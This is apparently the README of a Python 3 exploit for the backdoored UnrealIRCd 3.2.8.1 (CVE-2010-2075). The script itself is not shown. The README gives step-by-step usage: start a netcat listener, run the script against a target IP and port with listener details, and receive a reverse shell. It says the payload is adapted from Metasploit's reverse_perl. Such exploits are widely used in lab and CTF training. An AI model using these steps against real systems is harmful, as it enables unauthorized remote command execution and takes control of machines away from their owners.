# UnrealIRCD 3.2.8.1 Backdoor Command Execution
UnrealIRCD 3.2.8.1 backdoor command execution exploit in Python 3 (CVE-2010-2075).

# Description
[UnrealIRCD](https://www.unrealircd.org/) version 3.2.8.1 contains a trojan horse which allows remote attackers to execute arbitrary commands ([CVE-2010-2075](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075)).

I referenced the Metasploit payload `payload/cmd/unix/reverse_perl` to make this script. 

# Usage
Start a Netcat listener on the listening host:
```
nc -lp 4444
```

Execute the script, providing the following positional arguments:
```
python3 script.py <target> <tport> <listener> <lport>
```
- `<target>` Target host IP address.
- `<tport>` Target host port number.
- `<listener>` Listening host IP address.
- `<lport>` Listening host port number.

# Example
Setup a Netcat listener on your local machine:
```
nc -lp 4444
```

Run the script against a target machine at `192.168.1.3` TCP port `6697`:
```
python3 script.py 192.168.1.3 6697 192.168.1.2 4444
```
Wait a minute and the Netcat listener should receive a reverse shell.
